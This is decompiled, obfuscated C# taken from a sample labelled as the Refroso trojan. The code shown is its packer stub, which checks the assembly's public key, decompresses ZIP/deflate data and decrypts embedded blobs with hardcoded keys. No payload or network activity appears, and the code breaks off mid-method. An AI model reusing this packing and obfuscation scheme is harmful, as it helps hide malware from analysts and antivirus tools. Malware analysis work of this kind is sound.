// Decompiled with JetBrains decompiler
// Type: .
// Assembly: C, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F25E1EAB-EB04-4ECD-A70E-0143E63DFF03
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Refroso.hrpz-e40496d5f84ff83ebc4a14536714c2842f292149aa58d7861f48ee8d2476be88.exe

using \u0006;
using \u0008;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0006
{
  internal sealed class \u0004
  {
    public static string \u0001;

    private static bool \u0002([In] Assembly obj0, [In] Assembly obj1)
    {
      byte[] numArray1;
      byte[] publicKey1;
      int index;
      try
      {
        byte[] publicKey2 = obj0.GetName().GetPublicKey();
        if (true)
          numArray1 = publicKey2;
label_20:
        publicKey1 = obj1.GetName().GetPublicKey();
        int num1 = publicKey1 == null ? 1 : 0;
        int num2 = 0;
        int num3;
        int num4;
        int num5;
        if (num2 == 0)
        {
          if (num2 == 0)
          {
            num4 = numArray1 == null ? 1 : 0;
            num3 = num1;
          }
          else
          {
            num5 = num1;
            goto label_15;
          }
        }
        else
          goto label_17;
label_5:
        if (num3 != num4)
          return false;
        int num6;
        if (publicKey1 != null)
          num6 = 0;
        else
          goto label_18;
label_9:
        index = num6;
        if (false)
          goto label_20;
        else
          goto label_16;
label_15:
        index = num5;
label_16:
        int num7 = index;
        num2 = publicKey1.Length;
        num1 = num7;
label_17:
        int num8 = num2;
        if (num1 < num8)
        {
          num3 = (int) publicKey1[index];
          num4 = (int) numArray1[index];
          if (true)
          {
            if (num3 != num4)
            {
              int num9 = 0;
              if (num9 == 0)
                return num9 != 0;
              num6 = num9;
              goto label_9;
            }
            else
            {
              num5 = index + 1;
              goto label_15;
            }
          }
          else
            goto label_5;
        }
label_18:
        return true;
      }
      catch (Exception ex)
      {
        byte[] numArray2 = numArray1;
        byte[] numArray3 = publicKey1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) index;
        Assembly assembly1 = obj0;
        Assembly assembly2 = obj1;
        \u0005.\u0002(ex, (object) numArray2, (object) numArray3, (object) local, (object) assembly1, (object) assembly2);
        throw;
      }
    }

    public static byte[] \u0002([In] byte[] obj0)
    {
      \u0004.\u000F obj1;
      byte[] numArray1;
      int num1;
      short num2;
      int num3;
      int num4;
      int length1;
      int count1;
      int count2;
      byte[] buffer1;
      byte[] buffer2;
      byte[] buffer3;
      \u0004.\u0001 obj2;
      int num5;
      int length2;
      int num6;
      int length3;
      int num7;
      byte[] buffer4;
      \u0004.\u0001 obj3;
      byte[] numArray2;
      byte[] numArray3;
      \u0003 obj4;
      ICryptoTransform cryptoTransform1;
      byte[] numArray4;
      byte[] numArray5;
      byte[] numArray6;
      \u0002 obj5;
      ICryptoTransform cryptoTransform2;
      byte[] numArray7;
      Assembly callingAssembly;
      Assembly executingAssembly;
      try
      {
        callingAssembly = Assembly.GetCallingAssembly();
        executingAssembly = Assembly.GetExecutingAssembly();
        if ((object) callingAssembly != (object) executingAssembly)
          goto label_49;
label_4:
        obj1 = new \u0004.\u000F(obj0);
        numArray1 = new byte[0];
        num1 = obj1.\u0003();
        int num8;
        int num9;
        if (num1 == 67324752)
        {
          num2 = (short) obj1.\u0002();
          num3 = obj1.\u0002();
          num4 = obj1.\u0002();
          if (num1 != 67324752 || num2 != (short) 20 || num3 != 0 || num4 != 8)
            throw new FormatException("Wrong Header Signature");
          obj1.\u0003();
          obj1.\u0003();
          obj1.\u0003();
          length1 = obj1.\u0003();
          count1 = obj1.\u0002();
          count2 = obj1.\u0002();
          int num10;
          int num11;
          do
          {
            if (count1 > 0)
            {
              buffer1 = new byte[(int) checked ((uint) count1)];
              obj1.Read(buffer1, 0, count1);
            }
            if (true)
            {
              int num12 = count2;
              while (true)
              {
                if (num12 > 0)
                {
                  buffer2 = new byte[(int) checked ((uint) count2)];
                  obj1.Read(buffer2, 0, count2);
                }
                buffer3 = new byte[(int) checked ((uint) unchecked (obj1.Length - obj1.Position))];
                num10 = obj1.Read(buffer3, 0, buffer3.Length);
                num11 = 3;
                if (num11 != 0)
                {
                  if (num11 == 0)
                    num12 = num10;
                  else
                    break;
                }
                else
                  goto label_51;
              }
              obj2 = new \u0004.\u0001(buffer3);
            }
            numArray1 = new byte[(int) checked ((uint) length1)];
            obj2.\u0002(numArray1, 0, numArray1.Length);
            buffer3 = (byte[]) null;
          }
          while (false);
          goto label_48;
label_51:
          num9 = num11;
          num8 = num10;
          goto label_20;
        }
        else
        {
          num5 = num1 >> 24;
          num1 -= num5 << 24;
          num8 = num1;
        }
label_19:
        num9 = 8223355;
label_20:
        if (num8 != num9)
          throw new FormatException("Unknown Header");
        if (num5 == 1)
        {
          length2 = obj1.\u0003();
          numArray1 = new byte[(int) checked ((uint) length2)];
          num6 = 0;
          goto label_25;
        }
        else
          goto label_26;
label_24:
        obj3 = new \u0004.\u0001(buffer4);
        obj3.\u0002(numArray1, num6, num7);
        num6 += num7;
label_25:
        if (num6 < length2)
        {
          length3 = obj1.\u0003();
          num7 = obj1.\u0003();
          buffer4 = new byte[(int) checked ((uint) length3)];
          obj1.Read(buffer4, 0, buffer4.Length);
          goto label_24;
        }
label_26:
        if (num5 == 2)
        {
          numArray2 = new byte[8]
          {
            (byte) 109,
            (byte) 58,
            (byte) 131,
            (byte) 4,
            (byte) 197,
            (byte) 48,
            (byte) 17,
            (byte) 84
          };
          numArray3 = new byte[8]
          {
            (byte) 168,
            (byte) 127,
            (byte) 188,
            (byte) 11,
            (byte) 42,
            (byte) 139,
            byte.MaxValue,
            (byte) 131
          };
          obj4 = new \u0003();
          try
          {
            cryptoTransform1 = obj4.\u0002(numArray2, numArray3, true);
            try
            {
              numArray4 = cryptoTransform1.TransformFinalBlock(obj0, 4, obj0.Length - 4);
              numArray1 = \u0004.\u0002(numArray4);
            }
            finally
            {
              cryptoTransform1?.Dispose();
            }
          }
          finally
          {
            obj4?.Dispose();
          }
        }
        if (num5 == 3)
        {
          numArray5 = new byte[16]
          {
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1
          };
          numArray6 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
          obj5 = new \u0002();
          try
          {
            cryptoTransform2 = obj5.\u0002(numArray5, numArray6, true);
            try
            {
              numArray7 = cryptoTransform2.TransformFinalBlock(obj0, 4, obj0.Length - 4);
              numArray1 = \u0004.\u0002(numArray7);
            }
            finally
            {
              if (cryptoTransform2 == null)
                goto label_42;
label_41:
              cryptoTransform2.Dispose();
label_42:
              if (false)
                goto label_41;
            }
          }
          finally
          {
            obj5?.Dispose();
          }
        }
label_48:
        obj1.Close();
        return numArray1;
label_49:
        int num13 = \u0004.\u0002(executingAssembly, callingAssembly) ? 1 : 0;
        if (true)
        {
          if (num13 == 0)
          {
            if (true)
              return (byte[]) null;
            goto label_24;
          }
          else
            goto label_4;
        }
        else
        {
          num8 = num13;
          goto label_19;
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[33]
        {
          (object) callingAssembly,
          (object) executingAssembly,
          (object) obj1,
          (object) numArray1,
          (object) num1,
          (object) num2,
          (object) num3,
          (object) num4,
          (object) length1,
          (object) count1,
          (object) count2,
          (object) buffer1,
          (object) buffer2,
          (object) buffer3,
          (object) obj2,
          (object) num5,
          (object) length2,
          (object) num6,
          (object) length3,
          (object) num7,
          (object) obj3,
          (object) buffer4,
          (object) numArray2,
          (object) numArray3,
          (object) obj4,
          (object) cryptoTransform1,
          (object) numArray4,
          (object) numArray5,
          (object) numArray6,
          (object) obj5,
          (object) cryptoTransform2,
          (object) numArray7,
          (object) obj0
        };
        \u0005.\u0002(ex, objArray);
        throw;
      }
    }

    public static byte[] \u0003([In] byte[] obj0)
    {
      try
      {
        return \u0004.\u0002(obj0, 1, (byte[]) null, (byte[]) null);
      }
      catch (Exception ex)
      {
        byte[] numArray = obj0;
        \u0005.\u0002(ex, (object) numArray);
        throw;
      }
    }

    private static byte[] \u0002([In] byte[] obj0, [In] int obj1, [In] byte[] obj2, [In] byte[] obj3)
    {
      DateTime now;
      long num1;
      uint[] numArray1;
      uint maxValue;
      uint num2;
      int num3;
      int length1;
      \u0004.\u000F obj4;
      long position1;
      byte[] bytes;
      \u0004.\u0006 obj5;
      byte[] buffer1;
      int count1;
      byte[] buffer2;
      int count2;
      long num4;
      int srcOffset;
      byte[] dst;
      long position2;
      \u0004.\u0006 obj6;
      byte[] buffer3;
      int count3;
      byte[] buffer4;
      int count4;
      long position3;
      byte[] inputBuffer1;
      \u0003 obj7;
      ICryptoTransform cryptoTransform1;
      byte[] buffer5;
      byte[] inputBuffer2;
      \u0002 obj8;
      ICryptoTransform cryptoTransform2;
      byte[] buffer6;
      try
      {
        byte[] array;
        try
        {
          obj4 = new \u0004.\u000F();
          int num5;
          switch (obj1)
          {
            case 0:
              obj5 = new \u0004.\u0006();
              now = DateTime.Now;
              num1 = (long) ((uint) ((now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11 | now.Minute << 5) | (uint) now.Second >> 1);
              numArray1 = new uint[256]
              {
                0U,
                1996959894U,
                3993919788U,
                2567524794U,
                124634137U,
                1886057615U,
                3915621685U,
                2657392035U,
                249268274U,
                2044508324U,
                3772115230U,
                2547177864U,
                162941995U,
                2125561021U,
                3887607047U,
                2428444049U,
                498536548U,
                1789927666U,
                4089016648U,
                2227061214U,
                450548861U,
                1843258603U,
                4107580753U,
                2211677639U,
                325883990U,
                1684777152U,
                4251122042U,
                2321926636U,
                335633487U,
                1661365465U,
                4195302755U,
                2366115317U,
                997073096U,
                1281953886U,
                3579855332U,
                2724688242U,
                1006888145U,
                1258607687U,
                3524101629U,
                2768942443U,
                901097722U,
                1119000684U,
                3686517206U,
                2898065728U,
                853044451U,
                1172266101U,
                3705015759U,
                2882616665U,
                651767980U,
                1373503546U,
                3369554304U,
                3218104598U,
                565507253U,
                1454621731U,
                3485111705U,
                3099436303U,
                671266974U,
                1594198024U,
                3322730930U,
                2970347812U,
                795835527U,
                1483230225U,
                3244367275U,
                3060149565U,
                1994146192U,
                31158534U,
                2563907772U,
                4023717930U,
                1907459465U,
                112637215U,
                2680153253U,
                3904427059U,
                2013776290U,
                251722036U,
                2517215374U,
                3775830040U,
                2137656763U,
                141376813U,
                2439277719U,
                3865271297U,
                1802195444U,
                476864866U,
                2238001368U,
                4066508878U,
                1812370925U,
                453092731U,
                2181625025U,
                4111451223U,
                1706088902U,
                314042704U,
                2344532202U,
                4240017532U,
                1658658271U,
                366619977U,
                2362670323U,
                4224994405U,
                1303535960U,
                984961486U,
                2747007092U,
                3569037538U,
                1256170817U,
                1037604311U,
                2765210733U,
                3554079995U,
                1131014506U,
                879679996U,
                2909243462U,
                3663771856U,
                1141124467U,
                855842277U,
                2852801631U,
                3708648649U,
                1342533948U,
                654459306U,
                3188396048U,
                3373015174U,
                1466479909U,
                544179635U,
                3110523913U,
                3462522015U,
                1591671054U,
                702138776U,
                2966460450U,
                3352799412U,
                1504918807U,
                783551873U,
                3082640443U,
                3233442989U,
                3988292384U,
                2596254646U,
                62317068U,
                1957810842U,
                3939845945U,
                2647816111U,
                81470997U,
                1943803523U,
                3814918930U,
                2489596804U,
                225274430U,
                2053790376U,
                3826175755U,
                2466906013U,
                167816743U,
                2097651377U,
                4027552580U,
                2265490386U,
                503444072U,
                1762050814U,
                4150417245U,
                2154129355U,
                426522225U,
                1852507879U,
                4275313526U,
                2312317920U,
                282753626U,
                1742555852U,
                4189708143U,
                2394877945U,
                397917763U,
                1622183637U,
                3604390888U,
                2714866558U,
                953729732U,
                1340076626U,
                3518719985U,
                2797360999U,
                1068828381U,
                1219638859U,
                3624741850U,
                2936675148U,
                906185462U,
                1090812512U,
                3747672003U,
                2825379669U,
                829329135U,
                1181335161U,
                3412177804U,
                3160834842U,
                628085408U,
                1382605366U,
                3423369109U,
                3138078467U,
                570562233U,
                1426400815U,
                3317316542U,
                2998733608U,
                733239954U,
                1555261956U,
                3268935591U,
                3050360625U,
                752459403U,
                1541320221U,
                2607071920U,
                3965973030U,
                1969922972U,
                40735498U,
                2617837225U,
                3943577151U,
                1913087877U,
                83908371U,
                2512341634U,
                3803740692U,
                2075208622U,
                213261112U,
                2463272603U,
                3855990285U,
                2094854071U,
                198958881U,
                2262029012U,
                4057260610U,
                1759359992U,
                534414190U,
                2176718541U,
                4139329115U,
                1873836001U,
                414664567U,
                2282248934U,
                4279200368U,
                1711684554U,
                285281116U,
                2405801727U,
                4167216745U,
                1634467795U,
                376229701U,
                2685067896U,
                3608007406U,
                1308918612U,
                956543938U,
                2808555105U,
                3495958263U,
                1231636301U,
                1047427035U,
                2932959818U,
                3654703836U,
                1088359270U,
                936918000U,
                2847714899U,
                3736837829U,
                1202900863U,
                817233897U,
                3183342108U,
                3401237130U,
                1404277552U,
                615818150U,
                3134207493U,
                3453421203U,
                1423857449U,
                601450431U,
                3009837614U,
                3294710456U,
                1567103746U,
                711928724U,
                3020668471U,
                3272380065U,
                1510334235U,
                755167117U
              };
              maxValue = uint.MaxValue;
              num2 = maxValue;
              num3 = 0;
              length1 = obj0.Length;
              while (--length1 >= 0)
              {
                int num6 = (int) numArray1[(IntPtr) (uint) (((int) num2 ^ (int) obj0[num3++]) & (int) byte.MaxValue)];
                if (true)
                {
                  int num7 = (int) (num2 >> 8);
                  num2 = (uint) (num6 ^ num7);
                }
                else
                {
                  num5 = num6;
                  goto label_23;
                }
              }
              num2 ^= maxValue;
              obj4.\u0003(67324752);
              obj4.\u0002(20);
              obj4.\u0002(0);
              obj4.\u0002(8);
              obj4.\u0003((int) num1);
              obj4.\u0003((int) num2);
              position1 = obj4.Position;
              obj4.\u0003(0);
              obj4.\u0003(obj0.Length);
              bytes = Encoding.UTF8.GetBytes("{data}");
              obj4.\u0002(bytes.Length);
              obj4.\u0002(0);
              obj4.Write(bytes, 0, bytes.Length);
              obj5.\u0002(obj0);
              while (!obj5.\u0003())
              {
                buffer1 = new byte[512];
                count1 = obj5.\u0002(buffer1);
                if (count1 > 0)
                  obj4.Write(buffer1, 0, count1);
                else
                  break;
              }
              obj5.\u0002();
              while (!obj5.\u0002())
              {
                buffer2 = new byte[512];
                count2 = obj5.\u0002(buffer2);
                if (count2 > 0)
                  obj4.Write(buffer2, 0, count2);
                else
                  break;
              }
              num4 = obj5.\u0002();
              obj4.\u0003(33639248);
              obj4.\u0002(20);
              obj4.\u0002(20);
              obj4.\u0002(0);
              obj4.\u0002(8);
              obj4.\u0003((int) num1);
              obj4.\u0003((int) num2);
              obj4.\u0003((int) num4);
              obj4.\u0003(obj0.Length);
              obj4.\u0002(bytes.Length);
              obj4.\u0002(0);
              obj4.\u0002(0);
              obj4.\u0002(0);
              obj4.\u0002(0);
              obj4.\u0003(0);
              obj4.\u0003(0);
              obj4.Write(bytes, 0, bytes.Length);
              obj4.\u0003(101010256);
              obj4.\u0002(0);
              obj4.\u0002(0);
              obj4.\u0002(1);
              obj4.\u0002(1);
              obj4.\u0003(46 + bytes.Length);
              obj4.\u0003((int) ((long) (30 + bytes.Length) + num4));
              obj4.\u0002(0);
              obj4.Seek(position1, SeekOrigin.Begin);
              obj4.\u0003((int) num4);
              goto default;
            case 1:
              obj4.\u0003(25000571);
              obj4.\u0003(obj0.Length);
              srcOffset = 0;
              goto label_24;
            case 2:
              obj4.\u0003(41777787);
              inputBuffer1 = \u0004.\u0002(obj0, 1, (byte[]) null, (byte[]) null);
              obj7 = new \u0003();
              try
              {
                cryptoTransform1 = obj7.\u0002(obj2, obj3, false);
                try
                {
                  buffer5 = cryptoTransform1.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
                  obj4.Write(buffer5, 0, buffer5.Length);
                  goto default;
                }
                finally
                {
                  cryptoTransform1?.Dispose();
                }
              }
              finally
              {
                obj7?.Dispose();
              }
            case 3:
              obj4.\u0003(58555003);
              inputBuffer2 = \u0004.\u0002(obj0, 1, (byte[]) null, (byte[]) null);
              obj8 = new \u0002();
              try
              {
                cryptoTransform2 = obj8.\u0002(obj2, obj3, false);
                try
                {
                  buffer6 = cryptoTransform2.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                  obj4.Write(buffer6, 0, buffer6.Length);
                  goto default;
                }
                finally
                {
                  cryptoTransform2?.Dispose();
                }
              }
              finally
              {
                obj8?.Dispose();
              }
            default:
label_43:
              obj4.Flush();
              obj4.Close();
              array = obj4.ToArray();
              goto label_46;
          }
label_23:
          int length2 = dst.Length;
          srcOffset = num5 + length2;
label_24:
          if (srcOffset < obj0.Length)
          {
            dst = new byte[(int) checked ((uint) Math.Min(2097151, unchecked (obj0.Length - srcOffset)))];
            Buffer.BlockCopy((Array) obj0, srcOffset, (Array) dst, 0, dst.Length);
            position2 = obj4.Position;
            obj4.\u0003(0);
            obj4.\u0003(dst.Length);
            obj6 = new \u0004.\u0006();
            obj6.\u0002(dst);
            while (!obj6.\u0003())
            {
              buffer3 = new byte[512];
              count3 = obj6.\u0002(buffer3);
              if (count3 > 0)
                obj4.Write(buffer3, 0, count3);
              else
                break;
            }
            obj6.\u0002();
            while (!obj6.\u0002())
            {
              buffer4 = new byte[512];
              count4 = obj6.\u0002(buffer4);
              if (count4 > 0)
                obj4.Write(buffer4, 0, count4);
              else
                break;
            }
            position3 = obj4.Position;
            obj4.Position = position2;
            obj4.\u0003((int) obj6.\u0002());
            obj4.Position = position3;
            num5 = srcOffset;
            goto label_23;
          }
          else
            goto label_43;
        }
        catch (Exception ex)
        {
          \u0004.\u0001 = "ERR 2003: " + ex.Message;
          throw;
        }
label_46:
        return array;
      }
      catch (Exception ex)
      {
        byte[] numArray2;
        object[] objArray = new object[39]
        {
          (object) obj4,
          (object) obj5,
          (object) now,
          (object) num1,
          (object) numArray1,
          (object) maxValue,
          (object) num2,
          (object) num3,
          (object) length1,
          (object) position1,
          (object) bytes,
          (object) buffer1,
          (object) count1,
          (object) buffer2,
          (object) count2,
          (object) num4,
          (object) srcOffset,
          (object) dst,
          (object) position2,
          (object) obj6,
          (object) buffer3,
          (object) count3,
          (object) buffer4,
          (object) count4,
          (object) position3,
          (object) inputBuffer1,
          (object) obj7,
          (object) cryptoTransform1,
          (object) buffer5,
          (object) inputBuffer2,
          (object) obj8,
          (object) cryptoTransform2,
          (object) buffer6,
          (object) ex,
          (object) numArray2,
          (object) obj0,
          (object) obj1,
          (object) obj2,
          (object) obj3
        };
        \u0005.\u0002(ex, objArray);
        throw;
      }
    }

    internal sealed class \u0001
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private bool \u0001;
      private \u0004.\u0002 \u0001;
      private \u0004.\u0003 \u0001;
      private \u0004.\u0005 \u0001;
      private \u0004.\u0004 \u0001;
      private \u0004.\u0004 \u0002;

      public \u0001([In] byte[] obj0)
      {
        try
        {
          this.\u0001 = new \u0004.\u0002();
          this.\u0001 = new \u0004.\u0003();
          this.\u0001 = 2;
          this.\u0001.\u0002(obj0, 0, obj0.Length);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0005.\u0002(ex, (object) this, (object) numArray);
          throw;
        }
      }

      private bool \u0002()
      {
        int num1;
        int index1;
        int num2;
        int num3;
        int num4;
        try
        {
          num1 = this.\u0001.\u0002();
label_29:
          int num5;
          int num6;
          while (true)
          {
            int num7 = num1;
            if (true)
              goto label_30;
label_3:
            if (num7 < 258)
              break;
label_5:
            if (((index1 = this.\u0001.\u0002(this.\u0001)) & -256) != 0)
            {
              if (index1 >= 257)
              {
                this.\u0003 = \u0004.\u0001.\u0001[index1 - 257];
                this.\u0002 = \u0004.\u0001.\u0002[index1 - 257];
              }
              else
                goto label_7;
            }
            else
            {
              this.\u0001.\u0002(index1);
              num7 = --num1;
              goto label_3;
            }
label_13:
            int num8 = this.\u0002;
label_14:
            if (true)
            {
              if (num8 > 0)
              {
                this.\u0001 = 8;
                num2 = this.\u0001.\u0002(this.\u0002);
                if (num2 >= 0)
                {
                  this.\u0001.\u0002(this.\u0002);
                  this.\u0003 += num2;
                }
                else
                  goto label_17;
              }
              this.\u0001 = 9;
            }
            else
              goto label_25;
label_20:
            index1 = this.\u0002.\u0002(this.\u0001);
            if (index1 >= 0)
            {
              this.\u0004 = \u0004.\u0001.\u0003[index1];
              this.\u0002 = \u0004.\u0001.\u0004[index1];
            }
            else
              goto label_21;
label_23:
            if (this.\u0002 > 0)
            {
              this.\u0001 = 10;
              num3 = this.\u0001.\u0002(this.\u0002);
              num8 = num3;
            }
            else
              goto label_28;
label_25:
            if (num8 >= 0)
            {
              this.\u0001.\u0002(this.\u0002);
              this.\u0004 += num3;
            }
            else
              goto label_26;
label_28:
            this.\u0001.\u0002(this.\u0003, this.\u0004);
            num1 -= this.\u0003;
            this.\u0001 = 7;
            continue;
label_30:
            int num9;
            for (int index2 = 258; num7 >= index2; num7 = num9)
            {
              num4 = this.\u0001;
              num9 = num4;
              if (true)
              {
                int num10 = 7;
                if (num10 != 0)
                {
                  switch (num9 - num10)
                  {
                    case 0:
                      goto label_5;
                    case 1:
                      goto label_13;
                    case 2:
                      goto label_20;
                    case 3:
                      goto label_23;
                    default:
                      goto label_29;
                  }
                }
                else
                  index2 = num10;
              }
              else
              {
                num5 = num9;
                goto label_8;
              }
            }
            num6 = 1;
            if (num6 == 0)
            {
              num8 = num6;
              goto label_14;
            }
            else
              goto label_33;
          }
          return true;
label_7:
          num5 = index1;
label_8:
          if (num5 >= 0)
            goto label_10;
label_9:
          return false;
label_10:
          this.\u0002 = (\u0004.\u0004) null;
          this.\u0001 = (\u0004.\u0004) null;
          this.\u0001 = 2;
          if (true)
            return true;
          goto label_9;
label_17:
          return false;
label_21:
          return false;
label_26:
          return false;
label_33:
          return num6 != 0;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num4;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) this);
          throw;
        }
      }

      private bool \u0003()
      {
        int num1;
        int num2;
        int num3;
        int num4;
        try
        {
          int num5 = 7;
          if (num5 != 0)
          {
            if (num5 != 0)
            {
              num2 = this.\u0001;
              switch (num2)
              {
                case 2:
                  goto label_35;
                case 3:
                  this.\u0005 = num2 = this.\u0001.\u0002(16);
                  break;
                case 4:
label_19:
                  num3 = this.\u0001.\u0002(16);
                  if (num3 < 0)
                    return false;
                  this.\u0001.\u0002(16);
                  this.\u0001 = 5;
                  goto case 5;
                case 5:
                  num5 = this.\u0001.\u0002(this.\u0001, this.\u0005);
                  goto label_23;
                case 6:
                  if (!this.\u0001.\u0002(this.\u0001))
                    return false;
                  this.\u0001 = this.\u0001.\u0002();
                  this.\u0002 = this.\u0001.\u0003();
                  if (true)
                  {
                    this.\u0001 = 7;
                    goto case 7;
                  }
                  else
                    break;
                case 7:
                case 8:
                case 9:
                case 10:
                  return this.\u0002();
                case 12:
                  return false;
                default:
                  return false;
              }
              if (true)
              {
                if (num2 < 0)
                  return false;
                this.\u0001.\u0002(16);
                this.\u0001 = 4;
                goto label_19;
              }
              else
                goto label_24;
            }
            else
              goto label_38;
label_35:
            if (this.\u0001)
            {
              this.\u0001 = 12;
              return false;
            }
label_37:
            num1 = this.\u0001.\u0002(3);
label_38:
            if (num1 < 0)
              return false;
            this.\u0001.\u0002(3);
            if (true)
            {
              if ((num1 & 1) != 0)
                this.\u0001 = true;
              num2 = num1 >> 1;
              switch (num2)
              {
                case 0:
                  this.\u0001.\u0002();
                  this.\u0001 = 3;
                  goto label_12;
                case 1:
                  this.\u0001 = \u0004.\u0004.\u0001;
                  break;
                case 2:
                  this.\u0001 = new \u0004.\u0005();
                  this.\u0001 = 6;
                  goto label_12;
                default:
                  goto label_12;
              }
            }
            if (true)
            {
              this.\u0002 = \u0004.\u0004.\u0002;
              this.\u0001 = 7;
            }
            else
              goto label_37;
label_12:
            if (true)
              return true;
            goto label_35;
          }
label_23:
          num4 = num5;
label_24:
          this.\u0005 -= num4;
          if (this.\u0005 != 0)
            return !this.\u0001.\u0002();
          this.\u0001 = 2;
          return true;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num2;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) this);
          throw;
        }
      }

      public int \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        int num2;
        try
        {
          int num3 = 0;
          while (true)
          {
            if (num3 == 0)
            {
              if (true)
              {
                num2 = 0;
                goto label_15;
              }
              else
                goto label_15;
            }
label_5:
            int num4 = num2;
            int num5;
            if (true)
            {
              int num6 = num1;
              num2 = num4 + num6;
              obj2 -= num1;
              num5 = obj2;
            }
            else
              goto label_12;
label_7:
            if (num5 == 0)
              break;
label_9:
            num5 = this.\u0003() ? 1 : 0;
            if (true)
            {
              if (num5 == 0)
                num4 = this.\u0001.\u0003();
              else
                goto label_15;
            }
            else
              goto label_7;
label_12:
            if (num4 <= 0 || this.\u0001 == 11)
              goto label_13;
label_15:
            int num7;
            do
            {
              num7 = this.\u0001;
              if (true)
              {
                if (num7 == 11)
                  goto label_9;
              }
              else
                goto label_18;
            }
            while (false);
            goto label_16;
label_18:
            num3 = num7;
            continue;
label_16:
            num1 = this.\u0001.\u0002(obj0, obj1, obj2);
            obj1 += num1;
            goto label_5;
          }
          return num2;
label_13:
          return num2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj2;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) this, (object) numArray, (object) local3, (object) local4);
          throw;
        }
      }

      static \u0001()
      {
        try
        {
          do
          {
            int length1 = 29;
label_1:
            int[] numArray1 = new int[length1];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0005.\u0001));
            \u0004.\u0001.\u0001 = numArray1;
            while (true)
            {
              \u0004.\u0001.\u0002 = new int[29]
              {
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                1,
                1,
                1,
                1,
                2,
                2,
                2,
                2,
                3,
                3,
                3,
                3,
                4,
                4,
                4,
                4,
                5,
                5,
                5,
                5,
                0
              };
              if (true)
              {
                if (true)
                  \u0004.\u0001.\u0003 = new int[30]
                  {
                    1,
                    2,
                    3,
                    4,
                    5,
                    7,
                    9,
                    13,
                    17,
                    25,
                    33,
                    49,
                    65,
                    97,
                    129,
                    193,
                    257,
                    385,
                    513,
                    769,
                    1025,
                    1537,
                    2049,
                    3073,
                    4097,
                    6145,
                    8193,
                    12289,
                    16385,
                    24577
                  };
                else
                  continue;
              }
              int length2 = 30;
              if (length2 == 0)
              {
                length1 = length2;
                goto label_1;
              }
              else
              {
                int[] numArray2 = new int[length2];
                // ISSUE: field reference
                RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0005.\u0001));
                \u0004.\u0001.\u0004 = numArray2;
                break;
              }
            }
          }
          while (false);
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex);
          throw;
        }
      }
    }

    internal sealed class \u0002
    {
      private byte[] \u0001;
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public int \u0002([In] int obj0)
      {
label_0:
        int num1;
        try
        {
          int num2 = this.\u0003;
          int num3;
          while (true)
          {
            int num4 = obj0;
            if (num2 < num4)
              goto label_13;
label_4:
            long num5 = (long) this.\u0001;
            int num6 = 1;
            int num7 = obj0;
label_5:
            int num8 = 31;
            int num9;
            int num10;
            while (true)
            {
              int num11 = num7 & num8;
              num9 = num6 << num11;
              num10 = 1;
              if (num10 != 0)
              {
                while (true)
                {
                  if (true)
                  {
                    if (num10 == 0)
                    {
                      num7 = num10;
                      num6 = num9;
                      goto label_5;
                    }
                    else
                      goto label_10;
                  }
                }
                num8 = num10;
                num7 = num10;
                num6 = num9;
              }
              else
                break;
            }
label_10:
            long num12 = (long) (num9 - num10);
            num3 = (int) (num5 & num12);
            if (false)
            {
              num2 = num3;
              continue;
            }
            goto label_11;
label_13:
            if (this.\u0001 != this.\u0002)
            {
              \u0004.\u0002 obj1 = this;
              int num13 = (int) obj1.\u0001;
